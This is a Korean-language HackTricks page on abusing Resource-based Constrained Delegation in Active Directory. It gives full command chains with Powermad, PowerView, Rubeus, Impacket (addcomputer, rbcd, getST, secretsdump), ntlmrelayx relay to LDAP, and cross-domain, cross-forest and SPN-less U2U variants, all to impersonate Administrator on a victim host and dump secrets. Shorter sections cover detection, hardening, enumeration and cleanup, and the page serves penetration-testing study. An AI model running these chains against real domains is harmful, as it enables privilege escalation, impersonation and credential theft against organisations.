# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation 기초

Resource-based constrained delegation (RBCD)는 [constrained delegation](constrained-delegation.md)과 비슷하지만, 신뢰 방향이 반대입니다. 기존 constrained delegation은 principal이 어떤 서비스에 위임할 수 있는지 기록합니다. 반면 RBCD는 **대상 리소스**에 어떤 principal이 해당 리소스에 대해 사용자를 가장할 수 있는지 기록합니다.<sup>[[12]](#references)</sup>

대상 객체의 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 속성에는 해당 리소스에서 다른 identity를 대신해 동작할 수 있는 principal을 식별하는 security descriptor가 들어 있습니다.

또 다른 중요한 차이점은 **컴퓨터 계정에 대한 쓰기 권한**(`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` 및 이와 유사한 권한)이 충분한 principal은 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_를 설정할 수 있다는 점입니다. 기존 constrained delegation을 구성하려면 일반적으로 더 높은 권한의 관리 액세스가 필요합니다.<sup>[[1]](#references)</sup>

좀 더 정확히 말하면, 기존 constrained delegation 설정을 변경하려면 일반적으로 domain controller에서 `SeEnableDelegationPrivilege`가 필요하며, 이 권한은 보통 높은 권한을 가진 관리자만 보유합니다. RBCD에서는 대상 객체의 security descriptor가 위임 여부를 결정하므로, 해당 사용자 권한이 없어도 관련 컴퓨터 객체 속성에 대한 쓰기 권한만으로 충분할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 새로운 개념

`userAccountControl`의 **`TrustedToAuthForDelegation`** 플래그는 흔히 **S4U2Self**의 필수 조건으로 설명되지만, 이는 정확하지 않습니다.\
SPN이 있는 service principal은 해당 플래그 없이도 S4U2Self를 요청할 수 있습니다. `TrustedToAuthForDelegation`이 있으면 반환되는 service ticket은 **forwardable**이 되고, 없으면 일반적으로 **non-forwardable**이 됩니다.<sup>[[5]](#references)</sup>

기존 constrained delegation은 S4U2Proxy 단계에서 **non-forwardable TGS**를 거부합니다. RBCD는 대상의 security descriptor가 요청하는 서비스를 허용하는 경우 해당 S4U2Self ticket을 받아들일 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### 공격 구조

> **컴퓨터 계정**에 대해 **쓰기와 동등한 권한**이 있다면, 해당 머신에 대한 높은 권한의 액세스를 얻을 수 있습니다.

공격자가 이미 **피해자 컴퓨터 객체에 대해 쓰기와 동등한 권한**을 가지고 있다고 가정합니다.

1. 공격자는 **SPN**이 있는 계정을 **탈취하거나 생성**합니다("Service A"). 기본적으로 인증된 domain user는 **_MachineAccountQuota_**에 따라 최대 10개의 컴퓨터 객체를 생성할 수 있으며, 컴퓨터 객체에는 사용할 수 있는 SPN이 자동으로 부여됩니다.
2. 공격자는 피해자 컴퓨터(ServiceB)에 대한 WRITE 권한을 **악용**해, 해당 피해자 컴퓨터(ServiceB)를 대상으로 ServiceA가 모든 사용자를 가장할 수 있도록 **resource-based constrained delegation을 구성**합니다.
3. 공격자는 Rubeus를 사용해 Service A에서 Service B로 **전체 S4U 공격**(S4U2Self 및 S4U2Proxy)을 수행하며, Service B에 대한 높은 권한의 액세스가 있는 사용자를 대상으로 합니다.
   1. S4U2Self (탈취하거나 생성한 SPN 계정에서): **Administrator를 나타내는 TGS를 Service A에 요청**합니다(non-forwardable).
   2. S4U2Proxy: 해당 **non-forwardable TGS**를 사용해 피해자 호스트에 대한 **Administrator를 나타내는** service ticket을 요청합니다.
   3. 대상 리소스의 security descriptor에서 Service A를 허용하므로, 이 RBCD 흐름에서는 non-forwardable ticket도 사용할 수 있습니다.
4. 공격자는 **pass-the-ticket**을 수행하고 사용자를 **가장**해 **피해자 ServiceB에 액세스**할 수 있습니다.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0`으로 설정하면 기본 컴퓨터 생성 경로는 차단되지만, 대상 컴퓨터 객체에 대한 쓰기 권한이나 기존 계정 제어 권한까지 제거되는 것은 아닙니다. SPN이 없는 일반 사용자 계정을 제어하고 있다면, 같은 domain 내에서도 [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd)를 통해 해당 계정을 위임 principal로 사용할 수 있는 경우가 있습니다. 이 경로에도 유효한 RBCD 쓰기 권한, 위임 사용자 자격 증명에 대한 제어, 위임 가능한 가장 대상 identity, 호환되는 Kerberos 암호화 동작, 그리고 계정에 영향을 주는 NT-hash 변경이 필요합니다. 이러한 조건을 각각 별도의 전제 조건으로 취급하세요. RBCD 속성이 비어 있거나 quota가 0이라는 사실만으로 공격 성공 여부나 안전성이 입증되는 것은 아닙니다.

기존 RBCD descriptor에는 위임 컴퓨터를 직접 지정하는 대신 **그룹**이 지정되어 있을 수도 있습니다. SPN이 있는 컴퓨터 계정을 제어하고 해당 계정을 그룹에 추가할 수 있다면, 대상 컴퓨터의 RBCD 속성을 변경하지 않아도 새 멤버십으로 위임 경로가 생길 수 있습니다. 이 경로가 동작한다고 결론 내리기 전에 그룹의 유효 멤버십 쓰기 ACL(deny ACE 포함), 중첩 멤버십 및 token 갱신, descriptor의 trustee SID, 가장 대상 계정의 위임 제한, 대상 서비스 SPN을 확인하세요.

다음 명령을 사용하면 domain의 _**MachineAccountQuota**_를 확인할 수 있습니다:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Attack

### 컴퓨터 객체 생성

**[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>를 사용해 도메인 내에 컴퓨터 객체를 생성할 수 있습니다.

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Resource-based Constrained Delegation 구성

**Active Directory PowerShell 모듈 사용**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**powerview 사용하기**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### 완전한 S4U attack 수행하기 (Windows/Rubeus)

먼저 비밀번호 `123456`으로 새 Computer 객체를 만들었으므로, 해당 비밀번호의 hash가 필요합니다:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

해당 계정의 RC4 및 AES 해시를 출력합니다.\
이제 공격을 수행할 수 있습니다:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Rubeus의 `/altservice` 파라미터를 사용해 한 번만 요청하면 더 많은 서비스에 대한 티켓을 생성할 수 있습니다:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> 사용자에게 **"계정이 민감하며 위임할 수 없음"**으로 표시할 수 있습니다. 이 플래그가 활성화되면 이 위임 흐름을 통해 해당 계정을 가장할 수 없습니다. BloodHound는 분석 중 이 속성을 표시합니다.

### Linux 도구: Impacket을 사용한 엔드투엔드 RBCD(2024년 이후)

Linux에서 작업하는 경우 공식 Impacket 도구를 사용해 전체 RBCD 체인을 수행할 수 있습니다:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

참고
- LDAP signing/LDAPS가 강제되는 경우 `impacket-rbcd -use-ldaps ...`를 사용하세요.
- AES 키를 우선 사용하세요. 많은 최신 도메인에서는 RC4를 제한합니다. Impacket과 Rubeus 모두 AES 전용 흐름을 지원합니다.
- Impacket은 일부 도구에서 `sname`("AnySPN")을 다시 쓸 수 있지만, 가능하면 올바른 SPN을 확보하세요(예: CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## 도메인 간 및 포리스트 간 RBCD

제어하는 **위임 주체**가 **리소스 컴퓨터**와 **다른 도메인**(또는 **다른 포리스트**)에 있더라도, 이는 여전히 **RBCD** 악용이지만 티켓 흐름은 일반적인 단일 도메인의 `S4U2Self -> S4U2Proxy`와 달라집니다.

### SID를 사용해 외부 주체 설정하기

**다른 도메인**에서 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 설정하는 경우, 대상 도메인의 LDAP에서 외부 머신/사용자를 **이름으로 확인할 수 없을 수 있습니다**. 이 경우 sAMAccountName/UPN 대신 외부 주체의 **SID**를 사용해 위임 항목을 설정하세요.

이는 특히 `ntlmrelayx.py`를 사용해 LDAP로 NTLM을 릴레이할 때 중요합니다:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

참고:
- `--sid`는 `ntlmrelayx.py`가 `--escalate-user`를 SID로 처리하도록 지정하며, 위임 계정이 대상 도메인에 속하지 않는 경우 필요합니다.
- 도구에 `User not found in LDAP`가 출력되더라도 보안 설명자에 외부 SID가 직접 저장되므로 위임 설정은 성공할 수 있습니다.

### Cross-domain RBCD: cross-realm S4U sequence

외부 principal이 `msDS-AllowedToActOnBehalfOfOtherIdentity`에 추가되면, 작동하는 cross-domain 흐름은 다음과 같습니다:<sup>[[9]](#references)[[13]](#references)</sup>

1. 위임 principal의 자체 도메인에서 **TGT**를 가져옵니다.
2. `krbtgt/<target-domain>`에 대한 **referral TGT**를 요청합니다.
3. 대상 도메인 DC에서 가장할 사용자에 대한 **cross-realm S4U2Self referral**을 요청합니다.
4. 위임 도메인에서 해당 사용자에 대한 실제 **S4U2Self** 티켓을 요청합니다.
5. 위임 도메인에서 **S4U2Proxy**를 수행해 대상 도메인에 대한 referral 티켓을 가져옵니다.
6. 대상 도메인 DC에서 마지막 **S4U2Proxy**를 수행해 `cifs/host.target`, `host/host.target` 등에 대한 서비스 티켓을 가져옵니다.

이 때문에 기본 Linux 도구는 cross-domain RBCD에서 실패하는 경우가 많습니다:<sup>[[9]](#references)</sup>
- 요청의 **realm**은 `TGS-REQ`에서 사용된 TGT의 realm과 달라야 할 수 있습니다.
- 이 체인에는 **독립적인 S4U2Proxy 단계**가 필요하며, **S4U2Self**만 수행하거나 **S4U2Self** 직후 **S4U2Proxy**를 한 번만 수행해서는 안 됩니다.

### Linux에서의 Cross-domain RBCD

Synacktiv은 두 KDC를 명시적으로 처리해 Linux에서 cross-realm 시퀀스를 재현하는 Impacket `getST.py` 구현을 공개했습니다:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operationally, 새 인수는 다음과 같습니다.
- `-dc-ip`: **delegating** 도메인의 DC
- `-targetdomain`: **resource computer**의 도메인
- `-targetdc`: **resource** 도메인의 DC

### Cross-forest RBCD 제한 사항

Cross-forest RBCD에는 중요한 제한 사항이 있습니다. **가장된 사용자는 delegating principal과 동일한 forest에 속해야 합니다**. 즉, 제어 중인 머신 계정이 `valhalla.local`에 있고 대상 resource가 `asgard.local`에 있다면, 일반적으로 RBCD를 통해 임의의 `asgard.local` 사용자를 해당 resource에 가장할 수 **없습니다**.<sup>[[9]](#references)</sup>

다음과 같은 경우에는 여전히 악용할 수 있습니다.
- **delegating forest** 사용자가 다른 forest의 resource 호스트에서 **local admin**(또는 그 밖의 권한 보유자)인 경우
- trust가 필요한 인증 경로를 허용하고 대상 컴퓨터의 security descriptor에서 외부 SID를 허용하는 경우

### Cross-forest RBCD 프로토콜의 특이 사항

Cross-forest RBCD는 단순히 "trust가 추가된 cross-domain"이 아닙니다. 관찰된 흐름에는 일반적인 도구가 과거에 놓쳤던 두 가지 특이 사항이 있습니다.<sup>[[9]](#references)</sup>

1. **`PA-PAC-OPTIONS=branch-aware`**를 설정하는 추가 **S4U2Proxy** 요청
2. 다른 etype을 요청했더라도 최종 service ticket이 **RC4**를 사용해 반환될 수 있음

실제 흐름은 다음과 같습니다.

1. Forest A의 delegating principal에 대한 TGT를 가져옵니다.
2. Forest A에서 가장할 사용자에 대해 **S4U2Self**를 요청합니다.
3. Forest A에서 **S4U2Proxy**를 요청해 forest B에 대한 referral TGT를 가져옵니다.
4. Forest A에서 S4U2Self ticket을 additional ticket으로 포함하지 않고 `branch-aware`를 활성화한 두 번째 **S4U2Proxy**를 전송해 forest B에 대한 referral TGT를 하나 더 가져옵니다.
5. 선택적으로 forest B에서 delegating principal에 대한 일반 service ticket을 요청합니다(이 ticket은 최종 악용에 필요하지 않습니다).
6. 3단계와 4단계에서 가져온 referral ticket을 사용해 forest B에서 가장한 forest A 사용자가 대상 SPN에 접근할 최종 **S4U2Proxy** ticket을 요청합니다.

### Linux에서의 Cross-forest RBCD

동일한 Synacktiv Impacket 브랜치에서는 이 로직을 위한 `-forest` 스위치를 추가합니다.<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### 재귀적 multi-domain RBCD (3개 이상의 도메인)

**multi-domain forest**에서는 **S4U2Self**와 **S4U2Proxy**가 referral 한 번 이후에 멈추지 않고 **재귀적**으로 동작할 수 있습니다.

- **재귀적 S4U2Self**: 첫 번째 `S4U2Self`는 **가장할 사용자의 도메인**으로 전송되고, 중간의 parent/child 홉은 `krbtgt/<REALM>`에 대한 일반 `TGS-REQ` referral로 거친 다음, **최종 `S4U2Self`**는 **위임 주체의 자체 도메인**으로 전송됩니다.
- 즉, 머신 계정의 **TGT**만 보유해도 같은 forest의 다른 도메인에 있는 **admin을 가장**하고 `cifs/host`, `host/host`, `wsman/host` 등을 요청할 수 있습니다.
- **재귀적 S4U2Proxy**도 같은 방식으로 trust chain을 따릅니다. 중간 홉은 이전 ticket을 TGT로 재사용해 다음 `krbtgt/<REALM>` referral을 요청하며, 마지막 홉에서만 최종 service ticket을 반환합니다.<sup>[[10]](#references)</sup>

실제 same-forest 예시는 다음과 같습니다.

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN이 없는 cross-domain / cross-forest RBCD

**위임하는 principal이 SPN이 없는 사용자라면**, 마지막 재귀 `S4U2Self`가 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** 오류로 실패합니다. 해결 방법은 **마지막 단계만 `S4U2Self+U2U`로 다시 시도하는 것**입니다.<sup>[[10]](#references)</sup>

악용 체인의 간단한 버전:

1. KDC가 **RC4-HMAC (etype 23)**을 선택하도록 **NT hash**로 인증합니다.
2. 먼저 **`-self -u2u`**를 요청하고, 이 티켓을 나중의 proxy 단계와 분리해 보관합니다.
3. `describeTicket.py`로 **TGT 세션 키**를 추출합니다.
4. `changepasswd.py -newhashes <session_key>`를 사용해 사용자의 **NT hash**를 해당 **세션 키**로 바꿉니다.
5. 별도의 **`-proxy`** 요청에서 `S4U2Self+U2U` 티켓을 **`-additional-ticket`**으로 재사용합니다.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

운영상 주의 사항:

- **첫 번째 신뢰 홉이 이미 다른 forest인 경우**, 기본 Windows 동작과 일치하도록 **branch-aware** 알고리즘(`getST.py ... -forest`)을 우선 사용하세요. 외부 forest에 체인 후반부에서만 도달한다면, branch-aware가 아닌 재귀 흐름도 작동할 수 있습니다.<sup>[[9]](#references)</sup>
- 최신 **Windows Server 2022/2025** DC에서는 RC4 사용 중단으로 인해 RC4를 강제하면 **`KDC_ERR_ETYPE_NOSUPP`** 오류가 발생할 수 있습니다. 따라서 기존의 SPN 기반 RBCD는 AES로 여전히 작동하더라도 **SPN-less RBCD**는 불가능할 수 있습니다.<sup>[[15]](#references)</sup>
- 사용자의 해시/암호를 변경하기 전에 **`S4U2Self+U2U`를 실행하세요**: `SamrChangePasswordUser`는 계정의 Kerberos AES 키를 다시 계산하지 않으므로, 먼저 암호를 변경하면 이후 티켓 요청이 실패할 수 있습니다.<sup>[[14]](#references)</sup>
- 가장할 계정은 여전히 **위임 가능**해야 합니다: **Protected Users** 및 **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** 설정이 있는 계정은 체인을 차단합니다.

## 탐지 / 강화 참고 사항

- 도메인/forest 간 RBCD 경로는 여전히 대개 **ACL abuse** 또는 **relay-to-LDAP**를 통해 생성됩니다. 일반적인 설정 경로를 차단하려면 DC에서 **LDAP signing** 및 **LDAP channel binding**을 적용하세요.
- 컴퓨터 개체에서 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 쓸 수 있는 사용자를 감사하고, **foreign security principals**를 포함해 저장된 SID를 확인하세요.
- 신뢰 관계가 많은 환경에서는 **Selective Authentication**, **SID filtering**, 외부 forest 사용자가 리소스 호스트에서 **local admin** 권한을 보유하는지 검토하세요.

### 액세스

마지막 명령줄은 **전체 S4U 공격을 수행하고 Administrator의 TGS를 메모리에서 피해자 호스트에 삽입**합니다.\
이 예에서는 Administrator로부터 **CIFS** 서비스용 TGS를 요청했으므로 **C$**에 액세스할 수 있습니다:

```bash
ls \\victim.domain.local\C$
```

### 서로 다른 서비스 티켓 악용

[**사용 가능한 서비스 티켓은 여기에서 확인하세요**](silver-ticket.md#available-services).

## 열거, 감사 및 정리

### RBCD가 구성된 컴퓨터 열거

PowerShell (SID를 확인하기 위해 SD 디코딩):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (하나의 명령으로 읽기 또는 flush):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### 정리 / RBCD 초기화

- PowerShell (속성 지우기):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos 오류

- **`KDC_ERR_ETYPE_NOTSUPP`**: Kerberos가 DES 또는 RC4를 사용하지 않도록 구성되어 있는데 RC4 hash만 제공했다는 뜻입니다. Rubeus에 최소한 AES256 hash를 제공하세요(또는 RC4, AES128, AES256 hash를 모두 제공하세요). 예: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- 일반 사용자에 대해 `-self` 실행 중 발생하는 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: 위임 주체에 **SPN이 없을 가능성이 높습니다**. 일반적인 `S4U2Self` 대신 **`S4U2Self+U2U`**를 사용해 **마지막 hop**을 다시 시도하세요.<sup>[[10]](#references)</sup>
- **SPN이 없는 RBCD**에서 발생하는 **`KDC_ERR_ETYPE_NOSUPP`**: 최신 DC는 `S4U2Self+U2U`와 session-key-substitution 기법에 필요한 강제 **RC4-HMAC** 경로를 거부할 수 있습니다. 대신 AES를 사용해 기존의 **SPN 기반** RBCD 경로를 시도하세요.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: 현재 컴퓨터의 시간이 DC의 시간과 다르므로 Kerberos가 제대로 작동하지 않는다는 뜻입니다.
- **`preauth_failed`**: 제공된 username과 hash로 로그인할 수 없다는 뜻입니다. hash를 생성할 때 username에 `$`를 넣는 것을 잊었을 수 있습니다(`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`).
- **`KDC_ERR_BADOPTION`**: 다음을 의미할 수 있습니다.
  - 사칭하려는 사용자가 원하는 서비스에 액세스할 수 없습니다(사칭할 수 없거나 충분한 권한이 없는 경우).
  - 요청한 서비스가 존재하지 않습니다(winrm이 실행 중이지 않은데 winrm 티켓을 요청하는 경우).
  - 생성한 fakecomputer가 취약한 서버에 대한 권한을 잃었으므로 권한을 다시 부여해야 합니다.
  - classic KCD를 악용하고 있습니다. RBCD는 non-forwardable S4U2Self 티켓으로 작동하지만 KCD에는 forwardable 티켓이 필요합니다.

## 참고 사항, relay 및 대안

- LDAP가 필터링된 경우 AD Web Services(ADWS)를 통해 RBCD SD를 작성할 수도 있습니다. 참고:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chain은 한 번에 로컬 SYSTEM 권한을 얻기 위해 RBCD로 끝나는 경우가 많습니다. 실제 end-to-end 예시는 다음을 참고하세요:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding이 **비활성화**되어 있고 machine account를 만들 수 있다면, **KrbRelayUp** 같은 도구로 유도된 Kerberos 인증을 LDAP로 relay하고, 대상 컴퓨터 객체에서 machine account에 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 설정한 다음, off-host에서 S4U를 통해 즉시 **Administrator**를 사칭할 수 있습니다.<sup>[[8]](#references)</sup>

## References

- [1] [개를 흔들다: Resource-Based Constrained Delegation을 악용해 Active Directory 공격하기](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [위임에 관한 또 다른 이야기 – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: 컴퓨터 객체 탈취](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation 악용](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity가 도메인을 무너뜨리다: 공격 관점의 Kerberos 개요](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (공식)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [최신 구문을 포함한 간단한 Linux 참고표](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing 비활성화 → Kerberos relay로 RBCD 수행)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - 도메인 간 및 포리스트 간 RBCD 살펴보기](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - 도메인 간 및 포리스트 간 RBCD 살펴보기: 2부](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket 브랜치 - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation 개요](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - 도메인 간 S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kerberos에서 RC4 사용 감지 및 해결](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy 세부 정보](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
